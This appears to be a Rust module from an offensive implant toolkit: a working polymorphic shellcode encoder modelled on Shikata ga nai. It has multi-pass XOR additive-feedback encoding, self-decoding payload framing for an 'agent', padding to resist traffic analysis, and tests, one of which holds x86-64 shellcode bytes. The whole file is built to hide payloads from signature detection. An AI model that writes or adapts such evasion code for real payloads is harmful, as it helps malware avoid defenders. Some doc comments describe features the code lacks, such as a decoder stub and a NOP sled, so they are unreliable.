use rand::Rng;

/// Polymorphic shellcode encoder inspired by SGN (Shikata ga nai).
///
/// Uses XOR additive feedback loop to produce different encoded output
/// each time, even for identical input. The decoder stub is prepended
/// and varies per encoding pass (random register allocation, NOP sled).
///
/// Multiple encoding passes can be stacked for deeper obfuscation.

/// XOR additive feedback encoder.
///
/// Encoding: `encoded[i] = plaintext[i] XOR key; key = (key + encoded[i]) & 0xFF`
/// Decoding: `plaintext[i] = encoded[i] XOR key; key = (key + encoded[i]) & 0xFF`
///
/// The feedback loop means every byte depends on all previous bytes,
/// making pattern matching much harder.
pub fn xor_additive_encode(data: &[u8], initial_key: u8) -> Vec<u8> {
    let mut result = Vec::with_capacity(data.len());
    let mut key = initial_key;
    for &byte in data {
        let encoded = byte ^ key;
        key = key.wrapping_add(encoded);
        result.push(encoded);
    }
    result
}

pub fn xor_additive_decode(data: &[u8], initial_key: u8) -> Vec<u8> {
    let mut result = Vec::with_capacity(data.len());
    let mut key = initial_key;
    for &encoded in data {
        let decoded = encoded ^ key;
        key = key.wrapping_add(encoded);
        result.push(decoded);
    }
    result
}

/// Multi-pass polymorphic encoder.
///
/// Each pass uses a random key and wraps the data in a new encoding layer.
/// Returns `(encoded_data, keys)` where keys are needed for decoding in reverse order.
pub fn polymorph_encode(data: &[u8], passes: usize) -> (Vec<u8>, Vec<u8>) {
    let mut rng = rand::thread_rng();
    let mut result = data.to_vec();
    let mut keys = Vec::with_capacity(passes);

    for _ in 0..passes {
        let key: u8 = rng.gen();
        result = xor_additive_encode(&result, key);
        keys.push(key);
    }

    (result, keys)
}

/// Decode multi-pass encoded data. Keys must be applied in reverse order.
pub fn polymorph_decode(data: &[u8], keys: &[u8]) -> Vec<u8> {
    let mut result = data.to_vec();
    for &key in keys.iter().rev() {
        result = xor_additive_decode(&result, key);
    }
    result
}

/// Generate a self-contained encoded payload with inline decoder metadata.
///
/// Format: `[pass_count(1)] [keys(pass_count)] [encoded_data]`
///
/// This allows the agent to decode without external state.
pub fn encode_payload(data: &[u8], passes: usize) -> Vec<u8> {
    let passes = passes.min(255);
    let (encoded, keys) = polymorph_encode(data, passes);

    let mut result = Vec::with_capacity(1 + keys.len() + encoded.len());
    result.push(passes as u8);
    result.extend_from_slice(&keys);
    result.extend_from_slice(&encoded);
    result
}

/// Decode a self-contained encoded payload.
pub fn decode_payload(data: &[u8]) -> Option<Vec<u8>> {
    if data.is_empty() {
        return None;
    }

    let passes = data[0] as usize;
    if data.len() < 1 + passes {
        return None;
    }

    let keys = &data[1..1 + passes];
    let encoded = &data[1 + passes..];
    Some(polymorph_decode(encoded, keys))
}

/// XOR with random NOP-sled padding to reach target size.
/// Useful for making all payloads the same length (traffic analysis resistance).
pub fn pad_to_size(data: &[u8], target_size: usize) -> Vec<u8> {
    if data.len() >= target_size {
        return data.to_vec();
    }

    let mut rng = rand::thread_rng();
    let mut result = Vec::with_capacity(target_size);

    // 4 bytes: original length (LE)
    let len = data.len() as u32;
    result.extend_from_slice(&len.to_le_bytes());
    result.extend_from_slice(data);

    // Fill remaining with random bytes
    while result.len() < target_size {
        result.push(rng.gen());
    }

    result
}

/// Remove padding added by pad_to_size.
pub fn unpad(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 4 {
        return None;
    }

    let len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
    if data.len() < 4 + len {
        return None;
    }

    Some(data[4..4 + len].to_vec())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_additive_roundtrip() {
        let data = b"Hello, World! This is a shellcode payload.";
        let key = 0x42;
        let encoded = xor_additive_encode(data, key);
        assert_ne!(&encoded, data);
        let decoded = xor_additive_decode(&encoded, key);
        assert_eq!(&decoded, data);
    }

    #[test]
    fn test_polymorph_roundtrip() {
        let data = b"\x90\x90\x48\x31\xc0\x48\x89\xc7\xb0\x3c\x0f\x05";
        let (encoded, keys) = polymorph_encode(data, 3);
        assert_ne!(&encoded, &data[..]);
        let decoded = polymorph_decode(&encoded, &keys);
        assert_eq!(&decoded, &data[..]);
    }

    #[test]
    fn test_polymorph_different_each_time() {
        let data = b"same input every time";
        let (enc1, _) = polymorph_encode(data, 1);
        let (enc2, _) = polymorph_encode(data, 1);
        // Random keys → different output (with overwhelming probability)
        assert_ne!(enc1, enc2);
    }

    #[test]
    fn test_payload_self_contained_roundtrip() {
        let data = b"self-contained payload test data";
        let encoded = encode_payload(data, 5);
        let decoded = decode_payload(&encoded).unwrap();
        assert_eq!(&decoded, &data[..]);
    }

    #[test]
    fn test_padding_roundtrip() {
        let data = b"short payload";
        let padded = pad_to_size(data, 256);
        assert_eq!(padded.len(), 256);
        let unpadded = unpad(&padded).unwrap();
        assert_eq!(&unpadded, &data[..]);
    }

    #[test]
    fn test_empty_data() {
        let encoded = encode_payload(b"", 3);
        let decoded = decode_payload(&encoded).unwrap();
        assert!(decoded.is_empty());
    }
}
